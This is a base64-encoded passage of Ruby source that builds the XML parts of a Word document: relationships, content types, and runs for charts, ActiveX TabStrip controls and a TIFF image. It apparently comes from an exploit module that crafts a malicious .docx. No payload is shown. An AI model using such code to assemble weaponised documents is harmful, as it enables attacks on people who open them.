IikNCiAgICBidWlsZGVyID0gOjpOb2tvZ2lyaTo6WE1MOjpCdWlsZGVyLndpdGgobWQpIGRvIHx4bWx8DQogICAgeG1sLlJlbGF0aW9uc2hpcHMoJ3htbG5zJz0+Imh0dHA6Ly9zY2hlbWFzLm9wZW54bWxmb3JtYXRzLm9yZy9wYWNrYWdlLzIwMDYvcmVsYXRpb25zaGlwcyIpIGRvDQogICAgICByZWxhdGlvbnNoaXBzLmVhY2ggZG8gfHJ8DQogICAgICAgIHhtbC5SZWxhdGlvbnNoaXAoezpJZD0+InJJZCN7cls6aWRdLnRvX3N9IiwgOlR5cGU9PnJbOnR5cGVdLCA6VGFyZ2V0PT5yWzp0YXJnZXRdfSkNCiAgICAgIGVuZA0KICAgIGVuZA0KICAgIGVuZA0KDQogICAgYnVpbGRlci50b194bWwoOmluZGVudCA9PiAwKQ0KICBlbmQNCg0KDQogICMNCiAgIyBDcmVhdGVzIGEgX3JlbHMvLnJlbHMgZmlsZQ0KICAjDQogIGRlZiBpbml0X3JlbHMoZG9jX3htbCwgZG9jX3Byb3BzKQ0KICAgIHJlbHMgPSBbXQ0KICAgIHJlbHMgPDwgZG9jX3htbA0KICAgIHJlbHMgPDwgZG9jX3Byb3BzDQogICAgcmVscyA9IHJlbHMuZmxhdHRlbg0KDQogICAgbWQgPSA6Ok5va29naXJpOjpYTUwoIjw/eG1sIHZlcnNpb249XCIxLjBcIiBlbmNvZGluZz1cIlVURi04XCIgc3RhbmRhbG9uZT1cInllc1wiPz4iKQ0KICAgIGJ1aWxkZXIgPSA6Ok5va29naXJpOjpYTUw6OkJ1aWxkZXIud2l0aChtZCkgZG8gfHhtbHwNCiAgICB4bWwuUmVsYXRpb25zaGlwcygneG1sbnMnPT4iaHR0cDovL3NjaGVtYXMub3BlbnhtbGZvcm1hdHMub3JnL3BhY2thZ2UvMjAwNi9yZWxhdGlvbnNoaXBzIikgZG8NCiAgICAgIHJlbHMuZWFjaCBkbyB8cnwNCiAgICAgICAgeG1sLlJlbGF0aW9uc2hpcCh7OklkPT4icklkI3tyWzppZF0udG9fc30iLCA6VHlwZT0+cls6dHlwZV0sIDpUYXJnZXQ9PnJbOmZuYW1lXS5nc3ViKC9eXC8vLCAnJyl9KQ0KICAgICAgZW5kDQogICAgZW5kDQogICAgZW5kDQoNCiAgICB7DQogICAgICA6Zm5hbWUgPT4gIl9yZWxzLy5yZWxzIiwNCiAgICAgIDpkYXRhICA9PiBidWlsZGVyLnRvX3htbCg6aW5kZW50ID0+IDApDQogICAgfQ0KICBlbmQNCg0KDQogICMNCiAgIyBDcmVhdGVzIGEgcnVuIGVsZW1lbnQgZm9yIGNoYXJ0DQogICMgQHBhcmFtIHhtbCBbRWxlbWVudF0NCiAgIyBAcGFyYW0gcmlkIFtTdHJpbmddDQogICMNCiAgZGVmIGNyZWF0ZV9jaGFydF9ydW5fZWxlbWVudCh4bWwsIHJpZCkNCiAgICBkcmF3aW5nbWxfc2NoZW1hID0gImh0dHA6Ly9zY2hlbWFzLm9wZW54bWxmb3JtYXRzLm9yZy9kcmF3aW5nbWwvMjAwNiINCg0KICAgIHhtbC5yIGRvDQogICAgICB4bWwuclByIGRvDQogICAgICAgIHhtbC5ub1Byb29mDQogICAgICAgIHhtbC5sYW5nKHsndzp2YWwnID0+ICJlbi1VUyJ9KQ0KICAgICAgZW5kDQoNCiAgICAgIHhtbC5kcmF3aW5nIGRvDQogICAgICAgIHhtbFsnd3AnXS5pbmxpbmUoeydkaXN0VCc9PiIwIiwgJ2Rpc3RCJz0+IjAiLCAnZGlzdEwnPT4iMCIsICdkaXN0Uic9PiIwIn0pIGRvDQogICAgICAgICAgeG1sWyd3cCddLmV4dGVudCh7J2N4Jz0+JzEnLCAnY3knPT4nMSd9KQ0KICAgICAgICAgIHhtbFsnd3AnXS5lZmZlY3RFeHRlbnQoeydsJz0+IjEiLCAndCc9PiIwIiwgJ3InPT4iMSIsICdiJz0+IjAifSkNCiAgICAgICAgICB4bWxbJ3dwJ10uZG9jUHIoeydpZCc9PnJpZC50b19zLCAnbmFtZScgPT4gImRyYXdpbmcgI3tyaWQudG9fc30ifSkNCiAgICAgICAgICB4bWxbJ3dwJ10uY052R3JhcGhpY0ZyYW1lUHINCg0KICAgICAgICAgIHhtbFsnYSddLmdyYXBoaWMgZG8NCiAgICAgICAgICAgIHhtbFsnYSddLmdyYXBoaWNEYXRhKHsndXJpJz0+IiN7ZHJhd2luZ21sX3NjaGVtYX0vY2hhcnQifSkgZG8NCiAgICAgICAgICAgICAgeG1sWydjJ10uY2hhcnQoeydyOmlkJz0+InJJZCN7cmlkLnRvX3N9In0pDQogICAgICAgICAgICBlbmQNCiAgICAgICAgICBlbmQNCiAgICAgICAgZW5kDQogICAgICBlbmQNCiAgICBlbmQNCiAgZW5kDQoNCg0KICAjDQogICMgQ3JlYXRlcyBhIHJ1biBlbGVtZW50IGZvciBheA0KICAjIEBwYXJhbSB4bWwgW0VsZW1lbnRdDQogICMgQHBhcmFtIHJpZCBbU3RyaW5nXQ0KICAjDQogIGRlZiBjcmVhdGVfYXhfcnVuX2VsZW1lbnQoeG1sLCByaWQpDQogICAgc2hhcGVfYXR0cnMgPSB7DQogICAgICAnaWQnICAgID0+ICJfeDAwMDBfaTEwI3tyaWQudG9fc30iLA0KICAgICAgJ3R5cGUnICA9PiAiI194MDAwMF90NzUiLA0KICAgICAgJ3N0eWxlJyA9PiAid2lkdGg6MXB0O2hlaWdodDoxcHQiLA0KICAgICAgJ286b2xlJyA9PiAiIg0KICAgIH0NCg0KICAgIGNvbnRyb2xfYXR0cnMgPSB7DQogICAgICAncjppZCcgICAgICA9PiAicklkI3tyaWQudG9fc30iLA0KICAgICAgJ3c6bmFtZScgICAgPT4gIlRhYlN0cmlwI3tyaWQudG9fc30iLA0KICAgICAgJ3c6c2hhcGVpZCcgPT4iX3gwMDAwX2kxMCN7cmlkLnRvX3N9Ig0KICAgIH0NCg0KICAgIHhtbC5yIGRvDQogICAgICB4bWwub2JqZWN0KHsndzpkeGFPcmlnJz0+IjE0NDAiLCAndzpkeWFPcmlnJz0+IjE0NDAifSkgZG8NCiAgICAgICAgeG1sWyd2J10uc2hhcGUoc2hhcGVfYXR0cnMpDQogICAgICAgIHhtbFsndyddLmNvbnRyb2woY29udHJvbF9hdHRycykNCiAgICAgIGVuZA0KICAgIGVuZA0KICBlbmQNCg0KDQogICMNCiAgIyBDcmVhdGVzIGEgcGljIHJ1biBlbGVtZW50DQogICMgQHBhcmFtIHhtbCBbRWxlbWVudF0NCiAgIyBAcGFyYW0gcmlkIFtTdHJpbmddDQogICMNCiAgZGVmIGNyZWF0ZV9waWNfcnVuX2VsZW1lbnQoeG1sLCByaWQpDQogICAgZHJhd2lueG1sX3NjaGVtYSA9ICJodHRwOi8vc2NoZW1hcy5vcGVueG1sZm9ybWF0cy5vcmcvZHJhd2luZ21sLzIwMDYiDQoNCiAgICB4bWwuciBkbw0KICAgICAgeG1sLnJQciBkbw0KICAgICAgICB4bWwubm9Qcm9vZg0KICAgICAgICB4bWwubGFuZyh7J3c6dmFsJz0+ImVuLVVTIn0pDQogICAgICBlbmQNCg0KICAgICAgeG1sLmRyYXdpbmcgZG8NCiAgICAgICAgeG1sWyd3cCddLmlubGluZSh7J2Rpc3RUJz0+IjAiLCAnZGlzdEInPT4iMCIsICdkaXN0TCc9PiIwIiwgJ2Rpc3RSJz0+IjAifSkgZG8NCiAgICAgICAgICB4bWwuZXh0ZW50KHsnY3gnPT4nMScsICdjeSc9PicxJ30pDQogICAgICAgICAgeG1sWyd3cCddLmVmZmVjdEV4dGVudCh7J2wnPT4iMSIsICd0Jz0+IjAiLCAncic9PiIwIiwgJ2InPT4iMCJ9KQ0KICAgICAgICAgIHhtbFsnd3AnXS5kb2NQcih7J2lkJz0+cmlkLnRvX3MsICduYW1lJz0+ImltYWdlIiwgJ2Rlc2NyJz0+ImltYWdlLmpwZWcifSkNCiAgICAgICAgICB4bWxbJ3dwJ10uY052R3JhcGhpY0ZyYW1lUHIgZG8NCiAgICAgICAgICAgIHhtbFsnYSddLmdyYXBoaWNGcmFtZUxvY2tzKHsneG1sbnM6YSc9PiIje2RyYXdpbnhtbF9zY2hlbWF9L21haW4iLCAnbm9DaGFuZ2VBc3BlY3QnPT4iMSJ9KQ0KICAgICAgICAgIGVuZA0KDQogICAgICAgICAgeG1sWydhJ10uZ3JhcGhpYyh7J3htbG5zOmEnPT4iI3tkcmF3aW54bWxfc2NoZW1hfS9tYWluIn0pIGRvDQogICAgICAgICAgICB4bWxbJ2EnXS5ncmFwaGljRGF0YSh7J3VyaSc9PiIje2RyYXdpbnhtbF9zY2hlbWF9L3BpY3R1cmUifSkgZG8NCiAgICAgICAgICAgICAgeG1sWydwaWMnXS5waWMoeyd4bWxuczpwaWMnPT4iI3tkcmF3aW54bWxfc2NoZW1hfS9waWN0dXJlIn0pIGRvDQogICAgICAgICAgICAgICAgeG1sWydwaWMnXS5udlBpY1ByIGRvDQogICAgICAgICAgICAgICAgICB4bWxbJ3BpYyddLmNOdlByKHsnaWQnPT5yaWQudG9fcywgJ25hbWUnPT4iaW1hZ2UuanBlZyJ9KQ0KICAgICAgICAgICAgICAgICAgeG1sWydwaWMnXS5jTnZQaWNQcg0KICAgICAgICAgICAgICAgIGVuZA0KDQogICAgICAgICAgICAgICAgeG1sWydwaWMnXS5ibGlwRmlsbCBkbw0KICAgICAgICAgICAgICAgICAgeG1sWydhJ10uYmxpcCgncjplbWJlZCc9PiJySWQje3JpZC50b19zfSIsICdjc3RhdGUnPT4icHJpbnQiKQ0KICAgICAgICAgICAgICAgICAgeG1sWydhJ10uc3RyZXRjaCBkbw0KICAgICAgICAgICAgICAgICAgICB4bWxbJ2EnXS5maWxsUmVjdA0KICAgICAgICAgICAgICAgICAgZW5kDQogICAgICAgICAgICAgICAgZW5kDQoNCiAgICAgICAgICAgICAgICB4bWxbJ3BpYyddLnNwUHIgZG8NCiAgICAgICAgICAgICAgICAgIHhtbFsnYSddLnhmcm0gZG8NCiAgICAgICAgICAgICAgICAgICAgeG1sWydhJ10ub2ZmKHsneCc9PiIwIiwgJ3knPT4iMCJ9KQ0KICAgICAgICAgICAgICAgICAgICB4bWxbJ2EnXS5leHQoeydjeCc9PiIxIiwgJ2N5Jz0+IjEifSkNCiAgICAgICAgICAgICAgICAgIGVuZA0KDQogICAgICAgICAgICAgICAgICB4bWxbJ2EnXS5wcnN0R2VvbSh7J3Byc3QnID0+ICJyZWN0In0pIGRvDQogICAgICAgICAgICAgICAgICAgIHhtbFsnYSddLmF2THN0DQogICAgICAgICAgICAgICAgICBlbmQNCiAgICAgICAgICAgICAgICBlbmQNCiAgICAgICAgICAgICAgZW5kDQogICAgICAgICAgICBlbmQNCiAgICAgICAgICBlbmQNCiAgICAgICAgZW5kDQogICAgICBlbmQNCiAgICBlbmQNCiAgZW5kDQoNCg0KICAjDQogICMgQ3JlYXRlcyBhIGRvY3VtZW50LnhtbCBmaWxlDQogICMgQHBhcmFtIHByZV9kZWZzIFtBcnJheV0NCiAgIyBAcGFyYW0gYWN0aXZleCBbQXJyYXldDQogICMgQHBhcmFtIHRpZmZfZmlsZSBbQXJyYXldDQogICMgQHJldHVybiBbU3RyaW5nXSBYTUwgZG9jdW1lbnQNCiAgIw0KICBkZWYgaW5pdF9kb2NfeG1sKGxhc3RfcmlkLCBwcmVfZGVmcywgYWN0aXZleCwgdGlmZl9maWxlKQ0KICAgICMgR2V0IGFsbCB0aGUgcmVxdWlyZWQgcHJlLWRlZnMNCiAgICBjaGFydF9yaWRzID0gW10NCiAgICBwcmVfZGVmcy5zZWxlY3QgeyB8ZXwgY2hhcnRfcmlkcyA8PCBlWzppZF0gaWYgZVs6Zm5hbWVdID1+IC9cL3dvcmRcL2NoYXJ0c1wvL30NCg0KICAgICMgR2V0IGFsbCB0aGUgQWN0aXZlWCBSSURzDQogICAgYXhfcmlkcyA9IFtdDQogICAgYWN0aXZleC5zZWxlY3QgeyB8ZXwgYXhfcmlkcyA8PCBlWzppZF0gfQ0KDQogICAgIyBHZXQgdGhlIFRJRkYgUklEDQogICAgdGlmZl9yaWQgPSB0aWZmX2ZpbGVbOmlkXQ0KDQogICAgIyBEb2N1bWVudGF0aW9uIG9uIGhvdyB0aGlzIGlzIGNyYWZ0ZWQ6DQogICAgIyBodHRwOi8vbXNkbi5taWNyb3NvZnQuY29tL2VuLXVzL2xpYnJhcnkvb2ZmaWNlL2dnMjc4MzA4LmFzcHgNCiAgICBkb2NfYXR0cnMgPSB7DQogICAgICAneG1sbnM6dmUnICA9PiAiaHR0cDovL3NjaGVtYXMub3BlbnhtbGZvcm1hdHMub3JnL21hcmt1cC1jb21wYXRpYmlsaXR5LzIwMDYiLA0KICAgICAgJ3htbG5zOm8nICAgPT4gInVybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206b2ZmaWNlOm9mZmljZSIsDQogICAgICAneG1sbnM6cicgICA9PiBAc2NoZW1hLA0KICAgICAgJ3htbG5zOm0nICAgPT4gImh0dHA6Ly9zY2hlbWFzLm9wZW54bWxmb3JtYXRzLm9yZy9vZmZpY2VEb2N1bWVudC8yMDA2L21hdGgiLA0KICAgICAgJ3htbG5zOnYnICAgPT4gInVybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206dm1sIiwNCiAgICAgICd4bWxuczp3cCcgID0+ICJodHRwOi8vc2NoZW1hcy5vcGVueG1sZm9ybWF0cy5vcmcvZHJhd2luZ21sLzIwMDYvd29yZHByb2Nlc3NpbmdEcmF3aW5nIiwNCiAgICAgICd4bWxuczp3MTAnID0+ICJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOm9mZmljZTp3b3JkIiwNCiAgICAgICd4bWxuczp3JyAgID0+ICJodHRwOi8vc2NoZW1hcy5vcGVueG1sZm9ybWF0cy5vcmcvd29yZHByb2Nlc3NpbmdtbC8yMDA2L21haW4iLA0KICAgICAgJ3htbG5zOnduZScgPT4gImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vb2ZmaWNlL3dvcmQvMjAwNi93b3JkbWwiLA0KICAgICAgJ3htbG5zOmEnICAgPT4gImh0dHA6Ly9zY2hlbWFzLm9wZW54bWxmb3JtYXRzLm9yZy9kcmF3aW5nbWwvMjAwNi9tYWluIiwNCiAgICAgICd4bWxuczpjJyAgID0+ICJodHRwOi8vc2NoZW1hcy5vcGVueG1sZm9ybWF0cy5vcmcvZHJhd2luZ21sLzIwMDYvY2hhcnQiDQogICAgfQ0KDQogICAgcF9hdHRyc18xID0geyd3OnJzaWRSJyA9PiAiMDBGODI1NEYiLCAndzpyc2lkUkRlZmF1bHQnID0+ICIwMEQxNUJEMCIgfQ0KICAgIHBfYXR0cnNfMiA9IHsndzpyc2lkUicgPT4gIjAwRDE1QkQwIiwgJ3c6cnNpZFJQcicgPT4iMDBEMTVCRDAiLCAndzpyc2lkUkRlZmF1bHQnID0+ICIwMEQxNUJEMCIgfQ0KDQogICAgbWQgPSA6Ok5va29naXJpOjpYTUwoIjw/eG1sIHZlcnNpb249XCIxLjBcIiBlbmNvZGluZz1cIlVURi04XCIgc3RhbmRhbG9uZT1cInllc1wiPz4iKQ0KICAgIGJ1aWxkZXIgPSA6Ok5va29naXJpOjpYTUw6OkJ1aWxkZXIud2l0aChtZCkgZG8gfHhtbHwNCiAgICAgIHhtbC5jdXN0b21fcm9vdCgidyIpDQoNCiAgICAgIHhtbC5kb2N1bWVudChkb2NfYXR0cnMpIGRvDQogICAgICAgIHhtbC5ib2R5IGRvDQogICAgICAgICAgIyBQYXJhZ3JhcGggKEFjdGl2ZVgpDQogICAgICAgICAgeG1sLnAocF9hdHRyc18xKSBkbw0KICAgICAgICAgICAgIyBQYXJhZ3JhcGggcHJvcGVydGllcw0KICAgICAgICAgICAgeG1sLnBQciBkbw0KICAgICAgICAgICAgICAjIFJ1biBwcm9wZXJ0aWVzDQogICAgICAgICAgICAgIHhtbC5yUHIgZG8NCiAgICAgICAgICAgICAgICB4bWwubGFuZyh7J3c6dmFsJyA9PiAiZW4tVVMifSkNCiAgICAgICAgICAgICAgZW5kDQogICAgICAgICAgICBlbmQNCg0KICAgICAgICAgICAgYXhfcmlkcy5lYWNoIGRvIHxyaWR8DQogICAgICAgICAgICAgIGNyZWF0ZV9heF9ydW5fZWxlbWVudCh4bWwsIHJpZCkNCiAgICAgICAgICAgIGVuZA0KICAgICAgICAgIGVuZA0KDQogICAgICAgICAgeG1sLnAocF9hdHRyc18yKSBkbw0KICAgICAgICAgICAgeG1sLnBQciBkbw0KICAgICAgICAgICAgICB4bWwuclByIGRvDQogICAgICAgICAgICAgICAgeG1sWyd3J10ubGFuZyh7J3c6dmFsJz0+ImVuLVVTIn0pDQogICAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgZW5kDQoNCiAgICAgICAgICAgICMgQ2hhcnRzDQogICAgICAgICAgICBjaGFydF9yaWRzLmVhY2ggZG8gfHJpZHwNCiAgICAgICAgICAgICAgY3JlYXRlX2NoYXJ0X3J1bl9lbGVtZW50KHhtbCwgcmlkKQ0KICAgICAgICAgICAgZW5kDQoNCiAgICAgICAgICAgICMgVElGRg0KICAgICAgICAgICAgY3JlYXRlX3BpY19ydW5fZWxlbWVudCh4bWwsIHRpZmZfcmlkKQ0KICAgICAgICAgIGVuZA0KICAgICAgICBlbmQNCiAgICAgIGVuZA0KICAgIGVuZA0KDQogICAgew0KICAgICAgOmlkICAgICAgICAgICA9PiAobGFzdF9yaWQgKyAxKS50b19zLA0KICAgICAgOnR5cGUgICAgICAgICA9PiAiI3tAc2NoZW1hfS9vZmZpY2VEb2N1bWVudCIsDQogICAgICA6Zm5hbWUgICAgICAgID0+ICIvd29yZC9kb2N1bWVudC54bWwiLA0KICAgICAgOmNvbnRlbnRfdHlwZSA9PiAiYXBwbGljYXRpb24vdm5kLm9wZW54bWxmb3JtYXRzLW9mZmljZWRvY3VtZW50LndvcmRwcm9jZXNzaW5nbWwuZG9jdW1lbnQubWFpbit4bWwiLA0KICAgICAgOnhtbCAgICAgICAgICA9PiBidWlsZGVyLnRvX3htbCg6aW5kZW50ID0+IDApDQogICAgfQ0KICBlbmQNCg0KICAjDQogICMgQ3JlYXRlcyBhIFtDb250ZW50LlR5cGVzXS54bWwgZmlsZSBsb2NhdGVkIGluIHRoZSBwYXJlbnQgZGlyZWN0b3J5DQogICMgQHBhcmFtIG92ZXJyaWRlcyBbQXJyYXldIEEgY29sbGVjdGlvbiBvZiBoYXNoZXMgd2l0aCBlYWNoIGNvbnRhaW5pbmcNCiAgIyAgICAgICAgICAgICAgICAgICAgICAgICAgdGhlIDpQYXJ0TmFtZSBhbmQgOkNvbnRlbnRUeXBlIGluZm8NCiAgIyBAcmV0dXJuIFtTdHJpbmddIFhNTCBkb2N1bWVudA0KICAjDQogIGRlZiBtYWtlX2NvbnRlbnR0eXBlX3htbChvdmVycmlkZXMpDQogICAgY29udGVudHR5cGVzID0gWw0KICAgICAgew0KICAgICAgICA6RXh0ZW5zaW9uICAgPT4gInJlbHMiLA0KICAgICAgICA6Q29udGVudFR5cGUgPT4gImFwcGxpY2F0aW9uL3ZuZC5vcGVueG1sZm9ybWF0cy1wYWNrYWdlLnJlbGF0aW9uc2hpcHMreG1sIg0KICAgICAgfSwNCiAgICAgIHsNCiAgICAgICAgOkV4dGVuc2lvbiAgID0+ICJ4bWwiLA0KICAgICAgICA6Q29udGVudFR5cGUgPT4gImFwcGxpY2F0aW9uL3htbCINCiAgICAgIH0sDQogICAgICB7DQogICAgICAgIDpFeHRlbnNpb24gICA9PiAianBlZyIsDQogICAgICAgIDpDb250ZW50VHlwZSA9PiAiaW1hZ2UvanBlZyINCiAgICAgIH0sDQogICAgICB7DQogICAgICAgIDpFeHRlbnNpb24gICA9PiAiYmluIiwNCiAgICAgICAgOkNvbnRlbnRUeXBlID0+ICJhcHBsaWNhdGlvbi92bmQubXMtb2ZmaWNlLmFjdGl2ZVgiDQogICAgICB9LA0KICAgICAgew0KICAgICAgICA6RXh0ZW5zaW9uICA9PiAieGxzeCIsDQogICAgICAgIDpDb250ZW50VHlwZSA9PiAiYXBwbGljYXRpb24vdm5kLm9wZW54bWxmb3JtYXRzLW9mZmljZWRvY3VtZW50LnNwcmVhZHNoZWV0bWwuc2hlZXQiDQogICAgICB9DQogICAgXQ0KDQogICAgbWQgPSA6Ok5va29naXJpOjpYTUwoIjw/eG1sIHZlcnNpb249XCIxLjBcIiBlbmNvZGluZz1cIlVURi04XCIgc3RhbmRhbG9uZT1cInllc1wiPz4iKQ0KICAgIGJ1aWxkZXIgPSA6Ok5va29naXJpOjpYTUw6OkJ1aWxkZXIud2l0aChtZCkgZG8gfHhtbHwNCiAgICB4bWwuVHlwZXMoeyd4bWxucyc9PiJodHRwOi8vc2NoZW1hcy5vcGVueG1sZm9ybWF0cy5vcmcvcGFja2FnZS8yMDA2L2NvbnRlbnQtdHlwZXMifSkgZG8NCiAgICAgICMgRGVmYXVsdCBleHRlbnNpb25zDQogICAgICBjb250ZW50dHlwZXMuZWFjaCBkbyB8Y29udGVudHR5cGV8DQogICAgICAgIHhtbC5EZWZhdWx0KGNvbnRlbnR0eXBlKQ0KICAgICAgZW5kDQoNCiAgICAgICMgQWRkaXRpb25hbCBvdmVycmlkZXMNCiAgICAgIG92ZXJyaWRlcy5lYWNoIGRvIHxvdmVycmlkZXwNCiAgICAgICAgb3ZlcnJpZGVfYXR0cnMgPSB7DQogICAgICAgICAgOlBhcnROYW1lICAgID0+IG92ZXJyaWRlWzpQYXJ0TmFtZV0gfHwgb3ZlcnJpZGVbOmZuYW1lXSwNCiAgICAgICAgICA6Q29udGVudFR5cGUgPT4gb3ZlcnJpZGVbOkNvbnRlbnRUeXBlXQ0KICAgICAgICB9DQogICAgICAgIHhtbC5PdmVycmlkZShvdmVycmlkZV9hdHRycykNCiAgICAgIGVuZA0KICAgIGVuZA0KICAgIGVuZA0KDQogICAgYnVpbGRlci50b194bWwoOmluZGVudCA9PiAwKQ0KICBlbmQNCg0KDQogICMNCiAgIyBQcmUtZGVmaW5lIHNvbWUgaXRlbXMgdGhhdCB3aWxsIGJlIHVzZWQgaW4gLnJlbHMNCiAgIw0KICBkZWYgaW5pdF9kb2NfcHJvcHMobGFzdF9yaWQpDQogICAgaXRlbXMgPSBbXQ0KICAgIGl0ZW1zIDw8IHsNCiAgICAgIDppZCAgICAgICAgICAgPT4gKGxhc3RfcmlkICs9IDEpLA0KICAgICAgOnR5cGUgICAgICAgICA9PiAiI3tAc2NoZW1hfS9leHRlbmRlZC1wcm9wZXJ0aWVzIiwNCiAgICAgIDpmbmFtZSAgICAgICAgPT4gIi9kb2NQcm9wcy9hcHAueG1sIiwNCiAgICAgIDpjb250ZW50X3R5cGUgPT4gImFwcGxpY2F0aW9uL3ZuZC5vcGVueG1sZm9ybWF0cy1vZmZpY2Vkb2N1bWVudC5leHRlbmRlZC1wcm9wZXJ0aWVzK3htbCINCiAgICB9DQoNCiAgICBpdGVtcyA8PCB7DQogICAgICA6aWQgICAgICAgICAgID0+IChsYXN0X3JpZCArPSAxKSwNCiAgICAgIDp0eXBlICAgICAgICAgPT4gImh0dHA6Ly9zY2hlbWFzLm9wZW54bWxmb3JtYXRzLm9yZy9wYWNrYWdlLzIwMDYvcmVsYXRpb25zaGlwcy9tZXRhZGF0YS9jb3JlLXByb3BlcnRpZXMiLA0KICAgICAgOmZuYW1lICAgICAgICA9PiAiL2RvY1Byb3BzL2NvcmUueG1sIiwNCiAgICAgIDpjb250ZW50X3R5cGUgPT4gImFwcGxpY2F0aW9uL3ZuZC5vcGVueG1sZm9ybWF0cy1wYWNrYWdlLmNvcmUtcHJvcGVydGllcyt4bWwiDQogICAgfQ0KDQogICAgcmV0dXJuIGxhc3RfcmlkLCBpdGVtcw0KICBlbmQNCg0KDQogICMNCiAgIyBQcmUtZGVmaW5lIHNvbWUgaXRlbXMgdGhhdCB3aWxsIGJlIHVzZWQgaW4gZG9jdW1lbnQueG1sLnJlbHMNCiAgIw0KICBkZWYgaW5pdF9kb2NfeG1sX3JlbHNfaXRlbXMobGFzdF9yaWQpDQogICAgaXRlbXMgPSBbXQ0KICAgIGl0ZW1zIDw8IHsNCiAgICAgIDppZCAgICAgICAgICAgPT4gKGxhc3RfcmlkICs9IDEpLA0KICAgICAgOnR5cGUgICAgICAgICA9PiAiI3tAc2NoZW1hfS9zdHlsZXMiLA0KICAgICAgOmZuYW1lICAgICAgICA9PiAiL3dvcmQvc3R5bGVzLnhtbCIsDQogICAgICA6Y29udGVudF90eXBlID0+ICJhcHBsaWNhdGlvbi92bmQub3BlbnhtbGZvcm1hdHMtb2ZmaWNlZG9jdW1lbnQud29yZHByb2Nlc3NpbmdtbC5zdHlsZXMreG1sIg0KICAgIH0NCg0KICAgIGl0ZW1zIDw8IHsNCiAgICAgIDppZCAgICAgICAgICAgPT4gKGxhc3RfcmlkICs9IDEpLA0KICAgICAgOnR5cGUgICAgICAgICA9PiAiI3tAc2NoZW1hfS9zZXR0aW5ncyIsDQogICAgICA6Zm5hbWUgICAgICAgID0+ICIvd29yZC9zZXR0aW5ncy54bWwiLA0KICAgICAgOmNvbnRlbnRfdHlwZSA9PiAiYXBwbGljYXRpb24vdm5kLm9wZW54bWxmb3JtYXRzLW9mZmljZWRvY3VtZW50LndvcmRwcm9jZXNzaW5nbWwuc2V0dGluZ3MreG1sIg0KICAgIH0NCg0KICAgIGl0ZW1zIDw8IHsNCiAgICAgIDppZCAgICAgICAgICAgPT4gKGxhc3RfcmlkICs9IDEpLA0KICAgICAgOnR5cGUgICAgICAgICA9PiAiI3tAc2NoZW1hfS93ZWJTZXR0aW5ncyIsDQogICAgICA6Zm5hbWUgICAgICAgID0+ICIvd29yZC93ZWJTZXR0aW5ncy54bWwiLA0KICAgICAgOmNvbnRlbnRfdHlwZSA9PiAiYXBwbGljYXRpb24vdm5kLm9wZW54bWxmb3JtYXRzLW9mZmljZWRvY3VtZW50LndvcmRwcm9jZXNzaW5nbWwud2ViU2V0dGluZ3MreG1sIg0KICAgIH0NCg0KICAgIGl0ZW1zIDw8IHsNCiAgICAgIDppZCAgICAgICAgICAgPT4gKGxhc3RfcmlkICs9IDEpLA0KICAgICAgOnR5cGUgICAgICAgICA9PiAiI3tAc2NoZW1hfS9mb250VGFibGUiLA0KICAgICAgOmZuYW1lICAgICAgICA9PiAiL3dvcmQvZm9udFRhYmxlLnhtbCIsDQogICAgICA6Y29udGVudF90eXBlID0+ICJhcHBsaWNhdGlvbi92bmQub3BlbnhtbGZvcm1hdHMtb2ZmaWNlZG9jdW1lbnQud29yZHByb2Nlc3NpbmdtbC5mb250VGFibGUreG1sIg0KICAgIH0NCg0KICAgIGl0ZW1zIDw8IHsNCiAgICAgIDppZCAgICAgICAgICAgPT4gKGxhc3RfcmlkICs9IDEpLA0KICAgICAgOnR5cGUgICAgICAgICA9PiAiI3tAc2NoZW1hfS90aGVtZSIsDQogICAgICA6Zm5hbWUgICAgICAgID0+ICIvd29yZC90aGVtZS90aGVtZTEueG1sIiwNCiAgICAgIDpjb250ZW50X3R5cGUgPT4gImFwcGxpY2F0aW9uL3ZuZC5vcGVueG1sZm9ybWF0cy1vZmZpY2Vkb2N1bWVudC50aGVtZSt4bWwiDQogICAgfQ0KDQogICAgaXRlbXMgPDwgew0KICAgICAgOmlkICAgICAgICAgICA9PiAobGFzdF9yaWQgKz0gMSksDQogICAgICA6dHlwZSAgICAgICAgID0+ICIje0BzY2hlbWF9L2NoYXJ0IiwNCiAgICAgIDpmbmFtZSAgICAgICAgPT4gIi93b3JkL2NoYXJ0cy9jaGFydDEueG1sIiwNCiAgICAgIDpjb250ZW50X3R5cGUgPT4gImFwcGxpY2F0aW9uL3ZuZC5vcGVueG1sZm9ybWF0cy1vZmZpY2Vkb2N1bWVudC5kcmF3aW5nbWwuY2hhcnQreG1sIg0KICAgIH0NCg0KICAgIGl0ZW1zIDw8IHsNCiAgICAgIDppZCAgICAgICAgICAgPT4gKGxhc3RfcmlkICs9IDEpLA0KICAgICAgOnR5cGUgICAgICAgICA9PiAiI3tAc2NoZW1hfS9jaGFydCIsDQogICAgICA6Zm5hbWUgICAgICAgID0+ICIvd29yZC9jaGFydHMvY2hhcnQyLnhtbCIsDQogICAgICA6Y29udGVudF90eXBlID0+ICJhcHBsaWNhdGlvbi92bmQub3BlbnhtbGZvcm1hdHMtb2ZmaWNlZG9jdW1lbnQuZHJhd2luZ21sLmNoYXJ0K3htbCINCiAgICB9DQoNCiAgICBpdGVtcyA8PCB7DQogICAgICA6aWQgICAgICAgICAgID0+IChsYXN0X3JpZCArPSAxKSwNCiAgICAgIDp0eXBlICAgICAgICAgPT4gIiN7QHNjaGVtYX0vY2hhcnQiLA0KICAgICAgOmZuYW1lICAgICAgICA9PiAiL3dvcmQvY2hhcnRzL2NoYXJ0My54bWwiLA0KICAgICAgOmNvbnRlbnRfdHlwZSA9PiAiYXBwbGljYXRpb24vdm5kLm9wZW54bWxmb3JtYXRzLW9mZmljZWRvY3VtZW50LmRyYXdpbmdtbC5jaGFydCt4bWwiDQogICAgfQ0KDQogICAgaXRlbXMgPDwgew0KICAgICAgOmlkICAgICAgICAgICA9PiAobGFzdF9yaWQgKz0gMSksDQogICAgICA6dHlwZSAgICAgICAgID0+ICIje0BzY2hlbWF9L2NoYXJ0IiwNCiAgICAgIDpmbmFtZSAgICAgICAgPT4gIi93b3JkL2NoYXJ0cy9jaGFydDQueG1sIiwNCiAgICAgIDpjb250ZW50X3R5cGUgPT4gImFwcGxpY2F0aW9uL3ZuZC5vcGVueG1sZm9ybWF0cy1vZmZpY2Vkb2N1bWVudC5